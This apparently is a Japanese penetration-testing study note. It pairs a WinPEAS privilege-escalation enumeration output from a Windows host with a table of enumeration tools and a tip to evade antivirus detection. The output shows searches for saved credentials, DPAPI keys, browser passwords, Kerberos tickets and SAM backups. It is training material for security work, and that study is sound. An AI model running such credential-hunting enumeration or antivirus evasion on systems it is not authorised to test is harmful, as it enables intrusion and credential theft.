ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Credential manager
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): A specified logon session does not exist. It may already have been terminated'
Please run: 
cmdkey /list

ÉÍÍÍÍÍÍÍÍÍÍ¹ Saved RDP connections
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Remote Desktop Server/Client Settings
  RDP Server Settings
    Network Level Authentication            :       
    Block Clipboard Redirection             :       
    Block COM Port Redirection              :       
    Block Drive Redirection                 :       
    Block LPT Port Redirection              :       
    Block PnP Device Redirection            :       
    Block Printer Redirection               :       
    Allow Smart Card Redirection            :       

  RDP Client Settings
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False

ÉÍÍÍÍÍÍÍÍÍÍ¹ Recently run commands
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for RDCMan Settings Files
È Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#remote-desktop-credential-manager
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Kerberos tickets
È  https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/index.html
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for saved Wifi credentials
  [X] Exception: Unable to load DLL 'wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)
Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
No saved Wifi credentials found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking AppCmd.exe
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#appcmdexe
    Not Found
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking SSClient.exe
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#scclient--sccm
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating SSCM - System Center Configuration Manager settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Security Packages Credentials
  [X] Exception: Couldn't parse nt_resp. Len: 0 Message bytes: 4e544c4d535350000300000001000100620000000000000063000000000000005800000000000000580000000a000a00580000000000000063000000058a80a20a0063450000000f0a65f631666c30eb63370dafecfb66345300520056003200320000


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Browsers Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Firefox history
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Chrome DBs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Chrome history
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Chrome bookmarks
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current IE tabs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: The server process could not be started because the configured identity is incorrect. Check the username and password. (Exception from HRESULT: 0x8000401A)
   --- End of inner exception stack trace ---
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)
   at winPEAS.KnownFileCreds.Browsers.InternetExplorer.GetCurrentIETabs()
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in IE history
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history


ÉÍÍÍÍÍÍÍÍÍÍ¹ IE history -- limit 50

    http://go.microsoft.com/fwlink/p/?LinkId=255141

ÉÍÍÍÍÍÍÍÍÍÍ¹ IE favorites
    Not Found


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting files and registry ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty Sessions
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty SSH Host keys
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ SSH keys in registry
È If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#ssh-keys-in-registry
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ SuperPutty configuration files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Office 365 endpoints synced by OneDrive.

    SID: S-1-5-19
   =================================================================================================

    SID: S-1-5-20
   =================================================================================================

    SID: S-1-5-21-1151949782-2971075788-3621847170-1000
   =================================================================================================

    SID: S-1-5-21-1166644149-215888741-1708426353-1104
   =================================================================================================

    SID: S-1-5-18
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Unattend Files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for common SAM & SYSTEM backups

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for McAfee Sitelist.xml Files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached GPP Passwords

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible regs with creds
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible password files in users homes
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching for Oracle SQL Developer config files


ÉÍÍÍÍÍÍÍÍÍÍ¹ Slack files & directories
  note: check manually if something is found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for LOL Binaries and Scripts (can be slow)
È  https://lolbas-project.github.io/
   [!] Check skipped, if you want to run it, please specify '-lolbas' argument

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Outlook download files


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating machine and user certificate files


ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching known files that can contain creds in home
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for documents --limit 100--
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Office Most Recent Files -- limit 50

  Last Access Date           User                                           Application           Document

ÉÍÍÍÍÍÍÍÍÍÍ¹ Recent files --limit 70--
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking inside the Recycle Bin for creds files
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching hidden files or folders in C:\Users home (can be slow)

     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users
     C:\Users\Default
     C:\Users\All Users
     C:\Users\All Users\ntuser.pol

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching interesting files in other users home directories (can be slow)

  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\Users\<username>\winPEASx64.exe": <username> [Allow: AllAccess]

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Linux shells/distributions - wsl.exe, bash.exe

```

## 補足：ツール一覧

💡AVに検知される場合は、[[Module 16：Antivirus Evasion]]のテクニックを使用したり、他のツールを試したりする

| ツール名                                                                                   | 説明                                                                                                                                               |
| -------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/)         | Windowsの詳細情報を取得するためのユーティリティ集                                                                                                                     |
| [Seatbelt](https://github.com/GhostPack/Seatbelt)                                      | 権限昇格ベクターの自動列挙<br>すでにコンパイル済みのexeファイル：[Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries?tab=readme-ov-file) |
| [JAWS](https://github.com/411Hall/JAWS)                                                | 権限昇格ベクターの自動列挙                                                                                                                                    |
| [PowerUp.ps1](https://github.com/cmdMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) | 権限昇格ベクターの自動列挙・一部PrivEsc実行                                                                                                                        |
| [SharpUp.exe](https://github.com/GhostPack/SharpUp)                                    | PowerUpをC#に移行したもの<br>権限昇格ベクターの自動列挙のみ可能                                                                                                           |
| ⭐️[WinPEAS](https://github.com/peass-ng/PEASS-ng/releases/tag/20250124-6ec1269f)       | 権限昇格ベクターの自動列挙(最も有名でまずはこれを使う)                                                                                                                     |
